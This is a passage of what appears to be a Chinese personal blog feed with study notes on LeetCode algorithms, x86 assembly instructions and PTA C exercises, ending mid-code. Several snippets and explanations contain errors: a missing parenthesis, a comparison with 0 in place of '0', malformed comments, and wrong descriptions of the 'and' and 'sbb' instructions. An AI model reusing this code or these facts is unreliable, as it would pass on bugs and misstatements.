        <content type="html"><![CDATA[<p>之前做很多题的时候还没有搭blog，随便记录点后面做的简单题。<a id="more"></a></p><h2 id="摩尔投票"><a href="#摩尔投票" class="headerlink" title="摩尔投票"></a>摩尔投票</h2><p>个人总结：</p><p>在一群以小队为组的战争中， 2个遇到若不是同队的就双方阵亡，若2个人是同队的就结合起来。这样一直下去，最后留下来的人，将是这场战争中最多的人的小队的。该算法可以解决 计算一个数组中出现次数最多的元素。( 从第一个数开始count=1，遇到相同的就加1，遇到不同的就减1，减到0就重新换个数开始计数，总能找到最多的那个 )</p><p><img src="/2020/03/14/leetcode/image-20200314141207184-1590548390775.png" alt="image-20200314141207184"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">majorityElement</span><span class="params">(<span class="keyword">int</span>* nums, <span class="keyword">int</span> numsSize)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> count = <span class="number">0</span>, ans = <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; numsSize; i++)</span><br><span class="line">  &#123;</span><br><span class="line">     <span class="keyword">if</span>(nums[ans] == nums[i])</span><br><span class="line">       count++;</span><br><span class="line">     <span class="keyword">else</span></span><br><span class="line">       count--;</span><br><span class="line">      </span><br><span class="line">     <span class="keyword">if</span>(count == <span class="number">0</span>)</span><br><span class="line">       ans = i+<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">     <span class="keyword">if</span>(count &gt; numsSize/<span class="number">2</span>)</span><br><span class="line">       <span class="keyword">break</span>; </span><br><span class="line">  &#125;</span><br><span class="line">    </span><br><span class="line">  <span class="keyword">return</span> nums[ans];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="动态规划"><a href="#动态规划" class="headerlink" title="动态规划"></a>动态规划</h2><p>将一个问题，分成若干个的子问题解决 </p><pre><code>dp[i]表示nums[0]到nums[i]，含nums[i]的最长上升子序列；如果nums[j] &lt; nums[i],就dp[i]=max(dp[i],dp[j]+1)每次保存最大长度res=max(res,dp[i]) ////因为最后一个元素nums[n]，不一定在最长子序列中如[10,9,2,5,3,7,101,6][10,9,2,5,3,7,101,6],dp[0]=1[10,9,2,5,3,7,101,6],dp[1]=1[10,9,2,5,3,7,101,6],dp[2]=1[10,9,2,5,3,7,101,6],dp[3]=dp[2]+1 //res=2[10,9,2,5,3,7,101,6],dp[4]=dp[2]+1 //res=2[10,9,2,5,3,7,101,6],dp[5]=dp[3]+1 //res=3[10,9,2,5,3,7,101,6],dp[6]=dp[5]+1 //res=4[10,9,2,5,3,7,101,6],dp[7]=dp[4]+1 //res=4</code></pre><p><img src="/2020/03/14/leetcode/image-20200314142330565-1590548403309.png" alt="image-20200314142330565"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">lengthOfLIS</span><span class="params">(<span class="keyword">int</span>* nums, <span class="keyword">int</span> numsSize)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(numsSize == <span class="number">0</span>)</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">  <span class="keyword">int</span> <span class="built_in">max</span> = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">int</span> dp[numsSize];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; numsSize; i++)</span><br><span class="line">  &#123;</span><br><span class="line">      dp[i] = <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; i; j++) </span><br><span class="line">          <span class="keyword">if</span>(nums[i] &gt; nums[j])</span><br><span class="line">              dp[i] = dp[i] &gt; dp[j]+<span class="number">1</span> ? dp[i]:dp[j]+<span class="number">1</span>;</span><br><span class="line">      <span class="keyword">if</span>(dp[i] &gt; <span class="built_in">max</span></span><br><span class="line">         <span class="built_in">max</span> = dp[i];</span><br><span class="line">  &#125; </span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">max</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="旋转矩阵"><a href="#旋转矩阵" class="headerlink" title="旋转矩阵"></a>旋转矩阵</h2><p>对于矩阵中每一行都旋转90°， 在不占用额外空间情况下。可以先把整个矩阵转置一下，再左右的2的数交换一下位置即实现。</p><p><img src="/2020/03/14/leetcode/image-20200425195006467-1590548409622.png" alt="image-20200425195006467"></p><p>题解:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rotate</span><span class="params">(<span class="keyword">int</span>** matrix, <span class="keyword">int</span> matrixSize, <span class="keyword">int</span>* matrixColSize)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; matrixSize; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> j = i+<span class="number">1</span>; j &lt; *matrixColSize; j++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">int</span> temp = matrix[i][j];</span><br><span class="line">matrix[i][j] = matrix[j][i];</span><br><span class="line">matrix[j][i] = temp;</span><br><span class="line">&#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> mid = matrixSize &gt;&gt; <span class="number">1</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; matrixSize; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; mid; j++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">int</span> temp = matrix[i][j];</span><br><span class="line">matrix[i][j] = matrix[i][matrixSize-j<span class="number">-1</span>];</span><br><span class="line">matrix[i][matrixSize-j<span class="number">-1</span>] = temp;</span><br><span class="line">&#125; </span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h2 id="分割字符串"><a href="#分割字符串" class="headerlink" title="分割字符串"></a>分割字符串</h2><p><strong>一道题不难的题，但是觉得思想应该记一下。</strong></p><p><img src="/2020/03/14/leetcode/image-20200426184623169-1590548415836.png" alt="image-20200426184623169"></p><p>第一个思路是: 只管左边, 统计左边0和1出现的次数, 只要从左到右循环，0出现的次数与1出现的次数之差比第一个比开始大，那么我们的确定分割的位置就可以往后移。循环一遍，找到了位置，再分别相加。</p><p><strong>第二个思路:</strong> 先把所有的 1 都统计出来，再左往右循环， 只要是字符0就加1， 字符1就减1。第二个思路代码: C语言</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">maxScore</span><span class="params">(<span class="keyword">char</span> * s)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> ans = <span class="number">0</span>, count = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(s); i++)</span><br><span class="line">count += (s[i] == <span class="number">49</span> ? <span class="number">1</span> : <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(s); i++)</span><br><span class="line">&#123;</span><br><span class="line">count += (s[i] == <span class="number">0</span> ? <span class="number">1</span> : <span class="number">-1</span>);</span><br><span class="line"></span><br><span class="line">ans = (ans &gt; count ? ans : count);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>python3</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">maxScore</span><span class="params">(self, s: str)</span> -&gt; int:</span></span><br><span class="line">        count = s.count(<span class="string">'1'</span>)</span><br><span class="line">        ans = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> s[:<span class="number">-1</span>]:</span><br><span class="line">            <span class="keyword">if</span> i == <span class="string">'0'</span>:</span><br><span class="line">                count += <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                count -= <span class="number">1</span></span><br><span class="line">            ans = max(ans, count)</span><br><span class="line">        <span class="keyword">return</span> ans</span><br></pre></td></tr></table></figure><p>最后, 同然的算法, python虽然方便,但是python在时间和空间复杂度上, 比C语言大好多.</p><h2 id="异或运算"><a href="#异或运算" class="headerlink" title="异或运算"></a>异或运算</h2><blockquote><p><strong>异或运算的运用, 对逆向分析有帮助.</strong></p></blockquote><p>首先异或运算的性质有.</p><table><thead><tr><th>交换律</th><th>a ^ b  = b ^ a</th></tr></thead><tbody><tr><td><strong>结合律</strong></td><td><strong>(a ^ b) ^ c = a ^ (b ^ c)</strong></td></tr><tr><td><strong>对于任何数a</strong></td><td><strong>x ^ x = 0,  x ^ 0 = x</strong></td></tr><tr><td><strong>自反性</strong></td><td><strong>a ^ b = c  -&gt;  c ^ b = a</strong></td></tr></tbody></table><p>第一种题型: (要求是 空间复杂度 0(1)， 时间复杂度 0(n))</p><p>在一个数组 <code>nums</code> 中除一个数字只出现一次之外，其他数字都出现了2次。 请找出那个只出现一次的数字。</p><p><strong>思路一: 用数学的方法，首先让让数组中非重复的数字都相加后等2<code>(sum(set(nums)))*2</code>，然后让s该数组求和<code>(sum(nums))</code>，2者只差得到答案。</strong></p><p><strong>思路二：由异或运算的性质，我们让所有的元素异或运算，结果就是答案</strong></p><p>第二种题型，是第一种的延伸。</p><p><img src="/2020/03/14/leetcode/image-20200428123916375-1590548423589.png" alt="image-20200428123916375"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span>* <span class="title">singleNumbers</span><span class="params">(<span class="keyword">int</span>* nums, <span class="keyword">int</span> numsSize, <span class="keyword">int</span>* returnSize)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> sum = <span class="number">0</span>, flag = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> *ans = (<span class="keyword">int</span> *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">int</span>)*<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(ans, <span class="number">0</span>, <span class="keyword">sizeof</span>(<span class="keyword">int</span>)*<span class="number">2</span>);</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; numsSize; i++)</span><br><span class="line">sum ^= nums[i];    /有第一个题型, 我们知道最后结果是不相同两个数的异或结果.</span><br><span class="line"></span><br><span class="line">flag = (-sum)&amp;sum;  /取sum的所有位中第一个为<span class="number">1</span>的位.</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; numsSize; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(flag &amp; nums[i])   /将不相同的两个数进行分组, 依据上面计算的flag.</span><br><span class="line">ans[<span class="number">0</span>] ^= nums[i];</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">ans[<span class="number">1</span>] ^= nums[i]; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">    *returnSize = <span class="number">2</span>;</span><br><span class="line"><span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="qsort的使用"><a href="#qsort的使用" class="headerlink" title="qsort的使用"></a>qsort的使用</h2><p><strong>可以自定义排序，比自己的写的快排快多了。int cmp(const void *a, const void *b);</strong></p><p><img src="/2020/03/14/leetcode/image-20200608091627383.png" alt="image-20200608091627383"></p><p>这道题自己写的快排过不了，后面换用C库的qsort自定义排序就好了。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> m = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">cmp1</span><span class="params">(<span class="keyword">const</span> <span class="keyword">void</span> *a, <span class="keyword">const</span> <span class="keyword">void</span> *b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> (*(<span class="keyword">int</span> *)a-*(<span class="keyword">int</span> *)b);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">cmp2</span><span class="params">(<span class="keyword">const</span> <span class="keyword">void</span> *a, <span class="keyword">const</span> <span class="keyword">void</span> *b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> *p = (<span class="keyword">int</span> *)a;</span><br><span class="line"><span class="keyword">int</span> *q = (<span class="keyword">int</span> *)b;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">abs</span>(*p-m) == <span class="built_in">abs</span>(*q-m))</span><br><span class="line"><span class="keyword">return</span> *p-*q;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">return</span> <span class="built_in">abs</span>(*p-m)-<span class="built_in">abs</span>(*q-m);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span>* <span class="title">getStrongest</span><span class="params">(<span class="keyword">int</span>* arr, <span class="keyword">int</span> arrSize, <span class="keyword">int</span> k, <span class="keyword">int</span>* returnSize)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"> qsort(arr, arrSize, <span class="keyword">sizeof</span>(<span class="keyword">int</span>), cmp1);</span><br><span class="line"> m = arr[(arrSize<span class="number">-1</span>)/<span class="number">2</span>];</span><br><span class="line"> </span><br><span class="line"> qsort(arr, arrSize, <span class="keyword">sizeof</span>(<span class="keyword">int</span>), cmp2);</span><br><span class="line"> </span><br><span class="line"> *returnSize = k;</span><br><span class="line"> <span class="keyword">return</span> arr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>总结：根据题目要求自定义排序方法，还是很灵活。</strong></p>]]></content>
      
      
      <categories>
          
          <category> 数据结构与算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 算法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>汇编学习</title>
      <link href="/2020/03/06/%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0/"/>
      <url>/2020/03/06/%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h2 id="编译问题"><a href="#编译问题" class="headerlink" title="编译问题"></a>编译问题</h2><p>由于现在的计算机是64位，而debug是当年在16位的计算机上搞的，在32位计算机中，微软还在系统同增加了debug这个工具，但是到了64位，却没有加，所以我们要自己去下载一个 dosbox 开源的dos模拟器，然后将debug在dosbox中运行。当然这些都是没问题的。问题是: <a id="more"></a></p><p>在下载masm后，由于第一次接触，编写好源程序后，用指令 masm   xxx。asm 。但是一直报 A2044的错误，就百度，知乎，都说输入的格式错误，或者有非法字符。但是确定了没有之后还是报错，就这样痛苦了一晚上，第二天起来，还是不知道为什么，就抱着试一试(奔溃了),换了个masm版本，这次成功了。 但是在编写一个新的源程序，又是这个错误，再次崩，()/(ㄒoㄒ)/~~。</p><p>突然我想到，会不会是编码格式的错误呢，就换了UTF-8试一下，果然。。。</p><p>既然网上都说了格式或者非法字符，那怎么没想到编码问题呢。</p><h2 id="一些指令记录"><a href="#一些指令记录" class="headerlink" title="一些指令记录"></a>一些指令记录</h2><ul><li><p>and指令：OR是按位“或”操作。但是可以用来表示inc操作，比如 <code>0 and 3 = 0，1 and 3 = 1，2 and 3 = 2，3 and 3 = 3，4 and 3 = 0，5 and 3 = 1</code>，以此做 0-3 的循环。</p></li><li><p>not指令：按位取反。根据计算机中存储数据都是补码形式，所以我们用<del>运算符对一个数取相反数要(</del>a+1)，注意有一个加1。</p></li><li><p>sal指令：算数左移，移了的位用0填充。移动一位相当于乘2。与逻辑左移相同。</p></li><li><p>sar指令：算数右移，将数据向右移位，移了的位用符号位填充。如10000000算术右移1位后就成：11000000。移动一位相当于除2，不用考虑余数。 比如 eax = 3 (11) ， sar eax，1 后 eax = (01) = 1，相当于 3/2 = 1。</p></li><li><p>ror指令：<strong>循环右移</strong>，把所有位都向右移，最低位复制到进位标志位和最高位。指令用C语言来实现：如 <code>ror a，3</code> 对应 <code>((a&gt;&gt;3）| ((a&amp;7) &lt;&lt; 5))</code>。</p><p><img src="/2020/03/06/%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0/image-20200529164348298.png" alt="image-20200529164348298"></p></li><li><p>rol指令：<strong>循环左移</strong>，与ror类似。</p></li><li><p>neg：NEG命令无论你是否为正负数，都会按照取反+1或用0减去这个bai数的二进制的办法去计算。当操作数为0时，置CF位为0；当操作数不为0时，置CF位为1。<strong>intel手册：The CF flag set to 0 if the source operand is 0; otherwise it is set to 1。 The OF，SF，ZF，AF，and PF flags are set according to the result。</strong> </p></li><li><p>sbb：带借位减法指令，它利用了CF位上记录的借位值。指令格式：sbb 操作对象1，操作对象2；功能：操作对象1 = 操作对象1 - 操作对象2 - 1；</p></li><li><table><thead><tr><th>指令</th><th>同义名</th><th>效果</th><th>设置条件</th></tr></thead><tbody><tr><td>sete D</td><td>setz</td><td>D = ZF</td><td>相等/零</td></tr><tr><td>setne D</td><td>setnz</td><td>D = ~ZF</td><td>不等/非零</td></tr></tbody></table></li><li><p>cdq：这个指令把 EAX 的第 31 bit 复制到 EDX 的每一个 bit 上。 它大多出现在除法运算之前。它实际的作用只是把EDX的所有位都设成EAX最高位的值。也就是说，当EAX &lt;80000000，EDX 为00000000；当EAX &gt;= 80000000， EDX 则为FFFFFFFF。</p><p>例如 :</p><pre><code> 假设 EAX 是 FFFFFFFB (-5) ，它的第 31 bit (最左边) 是 1， 执行 CDQ 后， CDQ 把第 31 bit 复制至 EDX 所有 bit EDX 变成 FFFFFFFF这时候， EDX:EAX 变成 FFFFFFFF FFFFFFFB ，它是一个 64 bit 的大型数字，数值依旧是 -5。</code></pre><p>备注：</p><p>​    EDX:EAX,这里表示EDX，EAX连用表示64位数</p></li><li><p>xchg：寄存器和<a href="https://baike。baidu。com/item/内存变量/3389507" target="_blank" rel="noopener">内存变量</a>之间内容的交换指令，两个<a href="https://baike。baidu。com/item/操作数/7658270" target="_blank" rel="noopener">操作数</a>的数据类型要相同，可以是一个字节，也可以是一个字，也可以是双字。</p></li><li><p>shr 与shl：shl和shr是逻辑移位指令，shl是逻辑左移指令，它的功能为：（1）将一个寄存器或内存单元中的数据向左移位；（2）将<strong>最后移出的一位</strong>写入CF中；（3）最低位用0补充。shr是逻辑右移指令，它和shl所进行的操作刚好相反。</p></li><li><p>das：组合(压缩)BCD码的加法调整指令。使用DAS指令时，通常先执行SUB/SBB指令，将两个压缩BCD码相减，结果存放在AL中。功能：如果AL低四位&gt;9或AF=1 ，则AL的值减06h，并置AF=1；如果AL高四位&gt;9或CF=1 ，则AL的值减60h ,且置CF=1；</p></li><li><p>cdq：cdq的作用无非就是将一个32位有符合数扩展为64位有符合数，数据能表示的数不变，具体是这样实现的，比如eax=fffffffb（值为-5），然后cdq把eax的最高位bit，也就是二进制1，全部复制到edx的每一个bit位，EDX 变成 FFFFFFFF，这时eax与edx连起来就是一个64位数，FFFFFFFF FFFFFFFB ，它是一个 64 bit  的大型数字，数值依旧是 -5。</p></li></ul><h2 id="小端问题"><a href="#小端问题" class="headerlink" title="小端问题"></a>小端问题</h2><ul><li><p>在程序密码算法时，可能会将计算后的数据存放在4个内存单元，然后将其传给一个通用寄存器(EAX)，但是一般英特尔的cpu，数据存放形式都是小端，所以会将该4个内存单元的数据，以它小端存储方式读取，比如，4个连续内存单元的数据依次为 0x12  0x34  0x56  0x78，传给寄存器后，由于小端,所以为，0x78563412。 那么我们再写注册机的时候就可以，先定义一个联合:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">union</span> EAX</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">int</span> eax;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span>[<span class="number">4</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>依次，将4个数据存放在char[0 - 3] ，而eax就是我们要得值了。 (不过这里要注意使用<code>unsigned char</code> ，因为一个字节的最大数据为 2 ^8 - 1 (FF)， 有符号<code>char</code> 是 -2^7 ~ 2^7-1 ，用有符号<code>char</code> 很容易溢出)。</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 汇编 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>PTA与PAT乙级</title>
      <link href="/2019/11/17/PTA%E4%B8%8EPAT%E4%B9%99%E7%BA%A7/"/>
      <url>/2019/11/17/PTA%E4%B8%8EPAT%E4%B9%99%E7%BA%A7/</url>
      
        <content type="html"><![CDATA[<blockquote><p>PTA上C语言学习，细节方面有收获的地方与PAT乙级刷题心得。</p></blockquote><a id="more"></a><h2 id="PTA"><a href="#PTA" class="headerlink" title="PTA"></a>PTA</h2><h3 id="PTA上没有一下子想到方法的题"><a href="#PTA上没有一下子想到方法的题" class="headerlink" title="PTA上没有一下子想到方法的题"></a>PTA上没有一下子想到方法的题</h3><p><img src="/2019/11/17/PTA%E4%B8%8EPAT%E4%B9%99%E7%BA%A7/image-20200407130405852.png" alt="image-20200407130405852"></p><p>下面附上代码:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> m = <span class="number">0</span>, n = <span class="number">0</span>, hours = <span class="number">0</span>, minute = <span class="number">0</span>, end_time = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d %d"</span>, &amp;m, &amp;n);</span><br><span class="line"></span><br><span class="line">hours = m/<span class="number">100</span>, minute = m%<span class="number">100</span>;  <span class="comment">//需要学习的地方.</span></span><br><span class="line"></span><br><span class="line">hours += n/<span class="number">60</span>, minute += n-(n/<span class="number">60</span>)*<span class="number">60</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(minute &gt;= <span class="number">60</span>) </span><br><span class="line">hours += <span class="number">1</span>, minute -= <span class="number">60</span>; <span class="comment">//需要注意的地方.</span></span><br><span class="line"><span class="keyword">if</span>(minute &lt; <span class="number">0</span>)</span><br><span class="line">hours -=<span class="number">1</span>, minute += <span class="number">60</span>; <span class="comment">//需要注意的地方.</span></span><br><span class="line"></span><br><span class="line">end_time = hours*<span class="number">100</span> + minute; </span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d"</span>, end_time);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="PTA中做一道题，注意细节心得"><a href="#PTA中做一道题，注意细节心得" class="headerlink" title="PTA中做一道题，注意细节心得"></a>PTA中做一道题，注意细节心得</h3><p><img src="/2019/11/17/PTA%E4%B8%8EPAT%E4%B9%99%E7%BA%A7/image-20200413132934160.png" alt="image-20200413132934160"></p><p>下面附上代码:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">gcd</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> c = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(b)</span><br><span class="line">&#123;</span><br><span class="line">c = a%b;  <span class="comment">//求最大公约数中, 这里是  %  不要误写 /  ;</span></span><br><span class="line">a = b;</span><br><span class="line">b = c;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span 